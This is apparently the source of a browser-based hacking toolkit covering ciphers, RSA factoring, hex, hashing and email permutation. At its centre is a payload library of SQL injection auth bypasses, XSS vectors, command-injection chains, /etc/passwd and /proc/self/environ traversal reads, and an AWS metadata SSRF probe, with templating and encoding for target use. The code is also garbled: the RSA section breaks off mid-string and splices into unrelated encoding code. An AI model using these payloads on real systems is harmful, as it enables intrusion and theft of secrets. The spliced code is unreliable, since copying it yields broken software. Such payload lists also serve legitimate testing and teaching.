                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'Classical Cipher Lab'),
                    e('div', { className: 'grid grid-cols-2 gap-4' }, e('textarea', { value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono focus:border-[#00ff41] focus:outline-none resize-none' }), e('textarea', { value: output, readOnly: true, className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })),
                    e('div', { className: 'grid grid-cols-2 gap-4' },
                        e('div', null, e('h4', { className: 'text-sm font-bold mb-2 text-gray-400' }, 'CAESAR'), e('input', { type: 'number', value: shift, onChange: (ev) => setShift(parseInt(ev.target.value) || 0), min: 0, max: 25, className: 'w-20 px-3 py-2 mb-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none' }), e('div', { className: 'flex gap-2' }, e('button', { onClick: () => setOutput(caesarCipher(input, shift)), className: 'flex-1 px-3 py-2 bg-blue-600/20 border border-blue-500 rounded text-xs font-bold' }, 'ENC'), e('button', { onClick: () => setOutput(caesarCipher(input, shift, true)), className: 'flex-1 px-3 py-2 bg-purple-600/20 border border-purple-500 rounded text-xs font-bold' }, 'DEC'))),
                        e('div', null, e('h4', { className: 'text-sm font-bold mb-2 text-gray-400' }, 'VIGENÈRE'), e('input', { type: 'text', value: keyword, onChange: (ev) => setKeyword(ev.target.value), className: 'w-full px-3 py-2 mb-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none' }), e('div', { className: 'flex gap-2' }, e('button', { onClick: () => keyword && setOutput(vigenereCipher(input, keyword)), className: 'flex-1 px-3 py-2 bg-blue-600/20 border border-blue-500 rounded text-xs font-bold' }, 'ENC'), e('button', { onClick: () => keyword && setOutput(vigenereCipher(input, keyword, true)), className: 'flex-1 px-3 py-2 bg-purple-600/20 border border-purple-500 rounded text-xs font-bold' }, 'DEC')))
                    ),
                    e('button', { onClick: () => setOutput(freqAnalysis(input)), className: 'w-full px-4 py-3 bg-[#00ff41]/20 border border-[#00ff41] rounded text-[#00ff41] font-bold' }, 'FREQUENCY ANALYSIS')
                );
            }

            // RSA CALCULATOR
            if (tool === 'rsa-toolkit') {
                const gcd = (a, b) => b === 0 ? a : gcd(b, a % b);
                const modInverse = (a, m) => { let [or, r] = [a, m]; let [os, s] = [1, 0]; while (r !== 0) { const q = Math.floor(or / r); [or, r] = [r, or - q * r]; [os, s] = [s, os - q * s]; } return os < 0 ? os + m : os; };
                const factorN = () => { const mod = parseInt(rsaN); if (isNaN(mod) || mod < 4) { setOutput('Invalid'); return; } for (let i = 2; i <= Math.sqrt(mod); i++) { if (mod % i === 0) { setRsaP(i.toString()); setRsaQ((mod/i).toString()); setOutput(`p = $const library = loadPayloadLibrary();
e(/"/g, '&quot;').replace(/'/g, '&#39;');
    const base64Encode = (s) => {
        try {
            const bytes = new TextEncoder().encode(s ?? '');
            let binary = '';
            for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
            return btoa(binary);
        } catch (e) { return ''; }
    };
    const applyEncoding = (s) => {
        if (payloadEncoding === 'url') return encodeURIComponent(s);
        if (payloadEncoding === 'html') return encodeHtml(s);
        if (payloadEncoding === 'base64') return base64Encode(s);
        return s;
    };
    const fill = (s) => (s ?? '')
        .replace(/\{TARGET\}/g, payloadTarget)
        .replace(/\{PARAM\}/g, payloadParam)
        .replace(/\{CMD\}/g, payloadCmd)
        .replace(/\{IP\}/g, payloadIP)
        .replace(/\{PORT\}/g, payloadPort)
        .replace(/\{DOMAIN\}/g, domain);

    const library = {
        sqli: [
            { name: "Boolean auth bypass (single-quote)", payload: "' OR '1'='1' -- -", tags: "auth,boolean", notes: "Classic boolean-based bypass. May need adaptation to backend/quoting." },
            { name: "Boolean auth bypass (double-quote)", payload: "\" OR \"1\"=\"1\" -- -", tags: "auth,boolean", notes: "Useful when input is wrapped in double quotes." },
            { name: "Comment truncation", payload: "admin'-- -", tags: "auth,comment", notes: "Tries to comment out the rest of a query after username." },
            { name: "UNION basic (3 cols, NULLs)", payload: "' UNION SELECT NULL,NULL,NULL -- -", tags: "union", notes: "Adjust NULL count to match column count." },
            { name: "Time delay (MySQL)", payload: "' OR SLEEP(3) -- -", tags: "time", notes: "Simple time-based test (MySQL/MariaDB)." },
            { name: "Time delay (PostgreSQL)", payload: "'; SELECT pg_sleep(3) --", tags: "time", notes: "Time-based test (PostgreSQL)." },
            { name: "Order by probe", payload: "' ORDER BY 1 -- -", tags: "recon", notes: "Increment ORDER BY to infer column count." },
            { name: "Error-based probe", payload: "' AND 1=CONVERT(int,(SELECT @@version)) --", tags: "error", notes: "May trigger visible errors (SQL Server)." }
        ],
        xss: [
            { name: "Simple script tag", payload: "<script>alert(1)<\/script>", tags: "reflected", notes: "Works on permissive contexts. Escaped <\/script> is required inside script blocks." },
            { name: "IMG onerror", payload: "<img src=x onerror=alert(1)>", tags: "reflected", notes: "Often works when <script> is filtered but attributes pass." },
            { name: "SVG onload", payload: "<svg onload=alert(1)></svg>", tags: "reflected", notes: "Common alternative vector." },
            { name: "Attribute break-out (double quote)", payload: "\"><img src=x onerror=alert(1)>", tags: "attr", notes: "Use when injection occurs inside an HTML attribute quoted with \". " },
            { name: "HTML event handler", payload: "<button onclick=alert(1)>click</button>", tags: "dom", notes: "Basic event-handler test." }
        ],
        cmdi: [
            { name: "Command chain (;) + whoami", payload: "; {CMD}", tags: "unix", notes: "Semicolon command chaining; replace {CMD}." },
            { name: "Command chain (&&)", payload: "&& {CMD}", tags: "unix", notes: "Runs second command only if first succeeds." },
            { name: "Pipe into command (|)", payload: "| {CMD}", tags: "unix", notes: "Pipes output to command; sometimes useful for bypassing." },
            { name: "Windows chain (&)", payload: "& {CMD}", tags: "windows", notes: "Windows command separator." },
            { name: "Windows chain (&&)", payload: "&& {CMD}", tags: "windows", notes: "Windows conditional chain." }
        ],
        lfi: [
            { name: "Linux passwd", payload: "../../../../../etc/passwd", tags: "linux", notes: "Depth may vary; try adding/removing ../ segments." },
            { name: "Linux proc self environ", payload: "../../../../../proc/self/environ", tags: "linux,proc", notes: "Sometimes reveals env vars / secrets." },
            { name: "Windows hosts", payload: "..\..\..\Windows\System32\drivers\etc\hosts", tags: "windows", notes: "Backslashes for Windows paths." },
            { name: "Traversal with URL-encoding (../)", payload: "..%2f..%2f..%2fetc%2fpasswd", tags: "encoding", notes: "Use when raw ../ is filtered." }
        ],
        ssti: [
            { name: "Jinja2 basic expression", payload: "{{7*7}}", tags: "jinja2", notes: "If you see 49 rendered, template injection is likely." },
            { name: "Handlebars basic", payload: "{{this}}", tags: "handlebars", notes: "Framework detection helper." },
            { name: "ERB basic", payload: "<%= 7*7 %>", tags: "erb", notes: "Ruby ERB test." }
        ],
        ssrf: [
            { name: "Localhost probe", payload: "http://127.0.0.1/", tags: "internal", notes: "Checks if server can reach localhost." },
            { name: "Metadata (AWS)", payload: "http://169.254.169.254/latest/meta-data/", tags: "cloud", notes: "Cloud metadata endpoint probe (AWS). Use responsibly." },
            { name: "Targeted internal host", payload: "http://{IP}:{PORT}/", tags: "internal", notes: "Use placeholders for internal IP/port." }
        ],
        traversal: [
            { name: "Path traversal in parameter", payload: "{TARGET}?{PARAM}=../../../../etc/passwd", tags: "web", notes: "Template shows how traversal looks when used in a URL param." },
            { name: "Windows traversal in parameter", payload: "{TARGET}?{PARAM}=..\..\..\Windows\win.ini", tags: "web,windows", notes: "Common Windows file test." }
        ],
        redirect: [
            { name: "Open redirect (basic)", payload: "{TARGET}?next=https://{DOMAIN}/", tags: "web", notes: "Adjust parameter name to match app (next/url/redirect/return)." },
            { name: "Protocol-relative redirect", payload: "{TARGET}?next=//{DOMAIN}/", tags: "web", notes: "Sometimes bypasses filters that block http(s)://." }
        ],
        jwt: [
            { name: "Header/payload placeholder", payload: "HEADER.{PAYLOAD}.SIGNATURE", tags: "tokens", notes: "Use JWT tool to decode/edit/encode. Placeholder entry for workflows." }
        ]
    };

    const types = Object.keys(library);
    const q = payloadQuery.trim().toLowerCase();
    const entries = (library[payloadType] || []).filter(x => {
        if (!q) return true;
        const blob = `${x.name} ${x.payload} ${x.tags} ${x.notes}`.toLowerCase();
        return blob.includes(q);
    });

    const onSelect = (tpl) => {
        const rendered = fill(tpl.payload);
        const finalPayload = applyEncoding(rendered);
        setInput(finalPayload);
    };

    const pill = (active) => `px-3 py-2 rounded font-bold text-xs ${active ? 'bg-[#00ff41]/20 border border-[#00ff41] text-[#00ff41]' : 'bg-gray-700/20 border border-gray-600 text-gray-400 hover:border-[#00ff41]/40'}`;

    return e('div', { className: 'space-y-4' },
        e('div', { className: 'flex items-center justify-between gap-2' },
            e('h3', { className: 'text-lg font-bold', style: { color } }, 'Payload Generator (Elite)'),
            e('button', { onClick: () => copyToClipboard(input), className: 'px-3 py-2 bg-[#00ff41]/20 border border-[#00ff41] rounded text-xs font-bold text-[#00ff41] hover:bg-[#00ff41]/30' }, 'COPY')
        ),

        e('div', { className: 'grid grid-cols-1 lg:grid-cols-3 gap-3' },
            // LEFT: Types
            e('div', { className: 'bg-black/30 border border-gray-700 rounded p-3 space-y-2' },
                e('div', { className: 'text-xs text-gray-400 mb-2' }, 'Payload Type'),
                e('div', { className: 'grid grid-cols-2 gap-2' },
                    ...types.map(t => e('button', { key: t, onClick: () => setPayloadType(t), className: pill(payloadType === t) }, t.toUpperCase()))
                ),
                e('div', { className: 'mt-2 text-[11px] text-gray-500 leading-snug' },
                    'Templates support: {TARGET}, {PARAM}, {CMD}, {IP}, {PORT}, {DOMAIN}.'
                )
            ),

            // MIDDLE: Controls
            e('div', { className: 'bg-black/30 border border-gray-700 rounded p-3 space-y-3' },
                e('div', { className: 'text-xs text-gray-400' }, 'Search / Encode'),
                e('input', {
                    type: 'text',
                    value: payloadQuery,
                    onChange: (ev) => setPayloadQuery(ev.target.value),
                    placeholder: 'Search (e.g., union, time, windows, meta-data)...',
                    className: 'w-full px-3 py-2 bg-black/50 border border-gray-700 rounded text-sm font-mono focus:border-[#00ff41] focus:outline-none'
                }),
                e('div', { className: 'grid grid-cols-2 gap-2' },
                    e('select', {
                        value: payloadEncoding,
                        onChange: (ev) => setPayloadEncoding(ev.target.value),
                        className: 'w-full px-3 py-2 bg-black/50 border border-gray-700 rounded text-xs font-mono focus:border-[#00ff41] focus:outline-none'
                    },
                        e('option', { value: 'none' }, 'No encoding'),
                        e('option', { value: 'url' }, 'URL encode'),
                        e('option', { value: 'html' }, 'HTML entities'),
                        e('option', { value: 'base64' }, 'Base64')
                    ),
                    e('button', {
                        onClick: () => { setPayloadQuery(''); setPayloadEncoding('none'); },
                        className: 'px-3 py-2 bg-gray-700/20 border border-gray-600 rounded text-xs font-bold text-gray-300 hover:border-[#00ff41]/40'
                    }, 'RESET')
                ),
                e('div', { className: 'text-xs text-gray-400 pt-1' }, 'Template values'),
                e('div', { className: 'grid grid-cols-2 gap-2' },
                    e('input', { value: payloadTarget, onChange: (ev) => setPayloadTarget(ev.target.value), placeholder: '{TARGET}', className: 'w-full px-3 py-2 bg-black/50 border border-gray-700 rounded text-xs font-mono focus:border-[#00ff41] focus:outline-none' }),
                    e('input', { value: payloadParam, onChange: (ev) => setPayloadParam(ev.target.value), placeholder: '{PARAM}', className: 'w-full px-3 py-2 bg-black/50 border border-gray-700 rounded text-xs font-mono focus:border-[#00ff41] focus:outline-none' }),
                    e('input', { value: payloadCmd, onChange: (ev) => setPayloadCmd(ev.target.value), placeholder: '{CMD}', className: 'w-full px-3 py-2 bg-black/50 border border-gray-700 rounded text-xs font-mono focus:border-[#00ff41] focus:outline-none' }),
                    e('div', { className: 'grid grid-cols-2 gap-2' },
                        e('input', { value: payloadIP, onChange: (ev) => setPayloadIP(ev.target.value), placeholder: '{IP}', className: 'w-full px-3 py-2 bg-black/50 border border-gray-700 rounded text-xs font-mono focus:border-[#00ff41] focus:outline-none' }),
                        e('input', { value: payloadPort, onChange: (ev) => setPayloadPort(ev.target.value), placeholder: '{PORT}', className: 'w-full px-3 py-2 bg-black/50 border border-gray-700 rounded text-xs font-mono focus:border-[#00ff41] focus:outline-none' })
                    )
                )
            ),

            // RIGHT: Library
            e('div', { className: 'bg-black/30 border border-gray-700 rounded p-3 space-y-2' },
                e('div', { className: 'flex items-center justify-between' },
                    e('div', { className: 'text-xs text-gray-400' }, `Library (${entries.length})`),
                    e('div', { className: 'text-[11px] text-gray-500' }, payloadType.toUpperCase())
                ),
                e('div', { className: 'bg-black/50 border border-gray-800 rounded p-2 max-h-80 overflow-y-auto space-y-2' },
                    ...entries.map((tpl, i) => e('div', {
                        key: i,
                        className: 'bg-[#0f1419] border border-gray-800 rounded p-3 hover:border-[#00ff41]/50 cursor-pointer'
                    },
                        e('div', { className: 'flex items-start justify-between gap-2' },
                            e('div', { className: 'space-y-1' },
                                e('div', { className: 'text-xs font-bold text-gray-200' }, tpl.name),
                                e('code', { className: 'block text-[11px] text-gray-300 break-words' }, fill(tpl.payload)),
                                e('div', { className: 'text-[10px] text-gray-500 leading-snug' }, tpl.notes)
                            ),
                            e('button', {
                                onClick: (ev) => { ev.stopPropagation(); onSelect(tpl); },
                                className: 'px-2 py-1 bg-[#00ff41]/20 border border-[#00ff41] rounded text-[10px] font-bold text-[#00ff41] hover:bg-[#00ff41]/30'
                            }, 'USE')
                        )
                    ))
                )
            )
        ),

        e('div', { className: 'grid grid-cols-1 lg:grid-cols-2 gap-3' },
            e('div', { className: 'space-y-1' },
                e('div', { className: 'text-xs text-gray-400' }, 'Selected / Custom Payload'),
                e('textarea', {
                    value: input,
                    onChange: (ev) => setInput(ev.target.value),
                    className: 'w-full h-28 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono focus:border-[#00ff41] focus:outline-none resize-none'
                })
            ),
            e('div', { className: 'space-y-1' },
                e('div', { className: 'text-xs text-gray-400' }, 'Quick actions'),
                e('div', { className: 'grid grid-cols-2 gap-2' },
                    e('button', { onClick: () => setInput(''), className: 'px-3 py-2 bg-gray-700/20 border border-gray-600 rounded text-xs font-bold text-gray-300 hover:border-[#00ff41]/40' }, 'CLEAR'),
                    e('button', { onClick: () => setInput(applyEncoding(fill(input))), className: 'px-3 py-2 bg-[#00ff41]/20 border border-[#00ff41] rounded text-xs font-bold text-[#00ff41] hover:bg-[#00ff41]/30' }, 'APPLY TEMPLATE+ENC')
                )
            )
        )
    );
}

// URL PARSER
            if (tool === 'url-parser') {
                const parseURL = () => { try { const url = new URL(input); const params = {}; url.searchParams.forEach((v, k) => { params[k] = v; }); setOutput(JSON.stringify({ protocol: url.protocol, hostname: url.hostname, port: url.port || '(default)', pathname: url.pathname, params: params, hash: url.hash }, null, 2)); } catch(e) { setOutput('Error'); }};
                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'URL Parser'),
                    e('input', { type: 'text', value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full px-4 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none', placeholder: 'https://example.com/path?param=value' }),
                    e('button', { onClick: parseURL, className: 'w-full px-4 py-3 bg-[#00d9ff]/20 border border-[#00d9ff] rounded text-[#00d9ff] font-bold' }, 'PARSE'),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-48 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // HTML ENCODER
            if (tool === 'html-encoder') {
                const htmlEncode = (s) => s.split('').map(c => { const code = c.charCodeAt(0); return (code > 127 || '<>&"\''.includes(c)) ? '&#' + code + ';' : c; }).join('');
                const htmlDecode = (s) => { const t = document.createElement('textarea'); t.innerHTML = s; return t.value; };
                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'HTML Encoder'),
                    e('div', { className: 'grid grid-cols-2 gap-4' }, e('textarea', { value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full h-48 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono focus:border-[#00ff41] focus:outline-none resize-none' }), e('textarea', { value: output, readOnly: true, className: 'w-full h-48 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })),
                    e('div', { className: 'grid grid-cols-2 gap-2' }, e('button', { onClick: () => setOutput(htmlEncode(input)), className: 'px-3 py-2 bg-blue-600/20 border border-blue-500 rounded text-xs font-bold' }, 'ENCODE'), e('button', { onClick: () => setOutput(htmlDecode(input)), className: 'px-3 py-2 bg-purple-600/20 border border-purple-500 rounded text-xs font-bold' }, 'DECODE'))
                );
            }
            // HEX EDITOR
            if (tool === 'hex-editor') {
const textToHex = () => { const h = Array.from(input).map((c, i) => { const hx = c.charCodeAt(0).toString(16).padStart(2, '0'); return (i % 16 === 0 ? '\n' : '') + hx + ' '; }).join(''); setHexData(h); setOutput(h); };
                const hexToText = () => { try { const clean = hexData.replace(/[^0-9a-f]/gi, ''); const text = clean.match(/.{2}/g).map(h => String.fromCharCode(parseInt(h, 16))).join(''); setOutput(text); } catch(e) { setOutput('Error'); }};
                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'Hex Editor Pro'),
                    e('div', { className: 'grid grid-cols-2 gap-4' }, e('div', null, e('textarea', { value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono focus:border-[#00ff41] focus:outline-none resize-none' }), e('button', { onClick: textToHex, className: 'mt-2 w-full px-4 py-2 bg-[#00d9ff]/20 border border-[#00d9ff] rounded text-xs font-bold' }, 'TEXT → HEX')), e('div', null, e('textarea', { value: hexData, onChange: (ev) => setHexData(ev.target.value), className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono focus:border-[#00ff41] focus:outline-none resize-none' }), e('button', { onClick: hexToText, className: 'mt-2 w-full px-4 py-2 bg-[#ff00ff]/20 border border-[#ff00ff] rounded text-xs font-bold' }, 'HEX → TEXT'))),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // FILE ANALYZER
            if (tool === 'file-analyzer') {
                const magic = { 'PNG': '89504e47', 'JPEG': 'ffd8ffe0', 'GIF': '47494638', 'PDF': '25504446', 'ZIP': '504b0304', 'EXE': '4d5a' };
                const analyze = () => { const hex = input.replace(/\s/g, '').toLowerCase(); const m = []; for (const [type, sig] of Object.entries(magic)) { if (hex.startsWith(sig)) m.push(type); } setOutput(m.length > 0 ? `Identified: ${m.join(', ')}` : 'Unknown'); };
                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'File Analyzer'),
                    e('textarea', { value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full h-24 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono focus:border-[#00ff41] focus:outline-none resize-none', placeholder: 'Hex...' }),
                    e('button', { onClick: analyze, className: 'w-full px-4 py-3 bg-[#ff00ff]/20 border border-[#ff00ff] rounded text-[#ff00ff] font-bold' }, 'ANALYZE'),
                    e('div', { className: 'bg-black/50 border border-gray-700 rounded p-4 text-xs font-mono' }, ...Object.entries(magic).map(([t, s]) => e('div', { key: t, className: 'flex justify-between mb-1' }, e('span', { className: 'text-gray-400' }, t + ':'), e('span', { className: 'text-[#00d9ff]' }, s)))),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-24 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // STRING EXTRACTOR
            if (tool === 'string-extractor') {
const extract = () => { const regex = new RegExp(`[\\x20-\\x7E]{${minLen},}`, 'g'); const m = input.match(regex); setOutput(m ? `Found ${m.length}:\n\n` + m.join('\n') : 'None found'); };
                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'String Extractor'),
                    e('textarea', { value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono focus:border-[#00ff41] focus:outline-none resize-none' }),
                    e('div', { className: 'flex gap-4' }, e('input', { type: 'number', value: minLen, onChange: (ev) => setMinLen(parseInt(ev.target.value) || 4), min: 1, className: 'w-24 px-3 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none' }), e('button', { onClick: extract, className: 'flex-1 px-4 py-2 bg-[#00ff41]/20 border border-[#00ff41] rounded text-[#00ff41] font-bold' }, 'EXTRACT')),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-64 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // BINARY CONVERTER
            if (tool === 'binary-converter') {
                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'Binary Converter'),
                    e('textarea', { value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono focus:border-[#00ff41] focus:outline-none resize-none' }),
                    e('div', { className: 'grid grid-cols-3 gap-2' }, e('button', { onClick: () => setOutput(Array.from(input).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join(' ')), className: 'px-3 py-2 bg-blue-600/20 border border-blue-500 rounded text-xs font-bold' }, 'TO HEX'), e('button', { onClick: () => { try { setOutput(btoa(input)); } catch(e) { setOutput('Error'); }}, className: 'px-3 py-2 bg-purple-600/20 border border-purple-500 rounded text-xs font-bold' }, 'TO BASE64'), e('button', { onClick: () => setOutput(input.split('').map(c => c.charCodeAt(0).toString(2).padStart(8, '0')).join(' ')), className: 'px-3 py-2 bg-green-600/20 border border-green-500 rounded text-xs font-bold' }, 'TO BINARY')),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // ASCII CONVERTER
            if (tool === 'ascii-converter') {
                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'ASCII Converter'),
                    e('textarea', { value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono focus:border-[#00ff41] focus:outline-none resize-none' }),
                    e('div', { className: 'grid grid-cols-2 gap-2' }, e('button', { onClick: () => setOutput(input.split('').map(c => c.charCodeAt(0)).join(' ')), className: 'px-3 py-2 bg-blue-600/20 border border-blue-500 rounded text-xs font-bold' }, 'TO ASCII'), e('button', { onClick: () => setOutput(input.split(' ').map(n => String.fromCharCode(parseInt(n))).join('')), className: 'px-3 py-2 bg-purple-600/20 border border-purple-500 rounded text-xs font-bold' }, 'FROM ASCII')),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // ENDIAN CONVERTER
            if (tool === 'endian-converter') {
                const swap = () => { const hex = input.replace(/\s/g, ''); if (hex.length % 2 !== 0) { setOutput('Invalid'); return; } const pairs = hex.match(/.{2}/g) || []; setOutput(pairs.reverse().join('')); };
                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'Endian Converter'),
                    e('textarea', { value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full h-24 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono focus:border-[#00ff41] focus:outline-none resize-none' }),
                    e('button', { onClick: swap, className: 'w-full px-4 py-3 bg-[#ffaa00]/20 border border-[#ffaa00] rounded text-[#ffaa00] font-bold' }, 'SWAP ENDIANNESS'),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-24 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // BIT MANIPULATOR
            if (tool === 'bit-manipulator') {
const calc = () => { const a = parseInt(num), b = parseInt(num2); if (isNaN(a) || isNaN(b)) { setOutput('Invalid'); return; } let r; switch(op) { case 'and': r = a & b; break; case 'or': r = a | b; break; case 'xor': r = a ^ b; break; case 'not': r = ~a; break; case 'lshift': r = a << b; break; case 'rshift': r = a >> b; break; } setOutput(`Result: ${r}\nBinary: ${r.toString(2)}\nHex: 0x${r.toString(16)}`); };
                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'Bit Manipulator'),
                    e('div', { className: 'grid grid-cols-3 gap-2' }, e('input', { type: 'number', value: num, onChange: (ev) => setNum(ev.target.value), className: 'px-3 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none' }), e('select', { value: op, onChange: (ev) => setOp(ev.target.value), className: 'px-3 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none' }, e('option', { value: 'and' }, 'AND'), e('option', { value: 'or' }, 'OR'), e('option', { value: 'xor' }, 'XOR'), e('option', { value: 'not' }, 'NOT'), e('option', { value: 'lshift' }, '<<'), e('option', { value: 'rshift' }, '>>')), e('input', { type: 'number', value: num2, onChange: (ev) => setNum2(ev.target.value), className: 'px-3 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none' })),
                    e('button', { onClick: calc, className: 'w-full px-4 py-3 bg-[#ffaa00]/20 border border-[#ffaa00] rounded text-[#ffaa00] font-bold' }, 'CALCULATE'),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // NUMBER BASE
            if (tool === 'number-base') {
                const convert = (from) => { const n = from === 10 ? parseInt(input) : parseInt(input, from); if (isNaN(n)) { setOutput('Invalid'); return; } setOutput(`Dec: ${n}\nHex: 0x${n.toString(16)}\nOct: 0${n.toString(8)}\nBin: 0b${n.toString(2)}`); };
                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'Number Base'),
                    e('input', { type: 'text', value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full px-4 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none' }),
                    e('div', { className: 'grid grid-cols-4 gap-2' }, e('button', { onClick: () => convert(10), className: 'px-3 py-2 bg-blue-600/20 border border-blue-500 rounded text-xs font-bold' }, 'FROM DEC'), e('button', { onClick: () => convert(16), className: 'px-3 py-2 bg-purple-600/20 border border-purple-500 rounded text-xs font-bold' }, 'FROM HEX'), e('button', { onClick: () => convert(8), className: 'px-3 py-2 bg-green-600/20 border border-green-500 rounded text-xs font-bold' }, 'FROM OCT'), e('button', { onClick: () => convert(2), className: 'px-3 py-2 bg-yellow-600/20 border border-yellow-500 rounded text-xs font-bold' }, 'FROM BIN')),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // HASH CRACKER HELPER
            if (tool === 'hash-cracker') {
                const gen = () => { const vars = [input, input.toLowerCase(), input.toUpperCase(), input + '123', input + '!', input + '2024']; setOutput(vars.map(v => `${v} → MD5: ${CryptoJS.MD5(v).toString()}`).join('\n')); };
                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'Hash Helper'),
                    e('input', { type: 'text', value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full px-4 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none' }),
                    e('button', { onClick: gen, className: 'w-full px-4 py-3 bg-[#ff0055]/20 border border-[#ff0055] rounded text-[#ff0055] font-bold' }, 'GENERATE'),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-64 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // USERNAME FORMATTER
            if (tool === 'username-formatter') {
                const gen = () => { const parts = input.split(' '); const vars = [input.toLowerCase().replace(/\s/g, ''), input.toLowerCase().replace(/\s/g, '.'), input.toLowerCase().replace(/\s/g, '_'), input.toLowerCase().replace(/\s/g, '-'), parts[0]?.toLowerCase(), parts.map(p => p[0]).join('').toLowerCase()].filter(Boolean); setOutput(vars.join('\n')); };
                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'Username Formatter'),
                    e('input', { type: 'text', value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full px-4 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none' }),
                    e('button', { onClick: gen, className: 'w-full px-4 py-3 bg-[#ff0055]/20 border border-[#ff0055] rounded text-[#ff0055] font-bold' }, 'GENERATE'),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-48 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // EMAIL PERMUTATOR
            if (tool === 'email-permutator') {
const gen = () => { const parts = input.split(' '); const vars = [`${input.toLowerCase().replace(/\s/g, '')}@${domain}`, `${input.toLowerCase().replace(/\s/g, '.')}@${domain}`, `${input.toLowerCase().replace(/\s/g, '_')}@${domain}`, `${parts[0]?.toLowerCase()}@${domain}`, `${parts.map(p => p[0]).join('').toLowerCase()}@${domain}`].filter(Boolean); setOutput(vars.join('\n')); };
                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'Email Permutator'),
                    e('input', { type: 'text', value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full px-4 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none' }),
